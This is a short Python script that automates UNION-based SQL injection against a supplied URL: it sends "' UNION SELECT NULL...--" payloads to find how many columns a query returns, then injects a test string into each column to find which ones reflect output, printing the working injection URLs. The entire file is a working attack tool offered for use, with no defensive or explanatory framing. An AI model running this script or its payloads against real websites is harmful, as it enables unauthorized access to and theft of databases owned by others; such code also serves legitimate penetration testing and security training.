import sys
import re
import requests
import urllib.parse

def searchColumnNumber(target_url,column_number,comment):  
    col_num = -1

    print ("[+] Determining the number of columns")
    for x in range(0,column_number):
        target_inj = "' UNION SELECT NULL" + (x * ",NULL") + comment
        target_inj_encoded = urllib.parse.quote_plus(target_inj)
        target = target_url + target_inj_encoded
        response = requests.get(target)
        if response.status_code == 200:
            col_num = x
            break
    return col_num                    

def usefulDataType(target_url, num, comment):
    num = num + 1
    null_array = []
    string = "'test'"
    
    print("[+] Injecting string %s" %(string))
    for x in range(0, num):
        #buliding array according to results from searchColumnNumber
        null_array.append("NULL")

    for y in range (0,num):
        null_array[y] = string
        null_array_str = null_array[0]

        for z in range(1,len(null_array)):    
            null_array_str += ','+ str(null_array[z]) 

        target_inj = "' UNION SELECT " + null_array_str  + comment
        target_inj_encoded = urllib.parse.quote_plus(target_inj)
        target = target_url + target_inj_encoded

        response = requests.get(target)
        if response.status_code == 200:
            print("[+] Injection could be done in column %s" %(y+1))
            print("[+] String: " + target)
        null_array[y] = "NULL"
        


def main():
    if (len(sys.argv) != 3):
        print ("usage: <target> <number of columns to test>")
        print ("eg: https://192.168.1.100/?id=1 10")
        sys.exit(1)
    target_url = sys.argv[1]
    column_number = int(sys.argv[2])

    comment = "--"

    num = searchColumnNumber(target_url,column_number,comment)
    if num == -1:
        print("[-] Failed to determine number of columns")
    else:
        usefulDataType(target_url,num,comment)

if __name__ == "__main__":
    main()
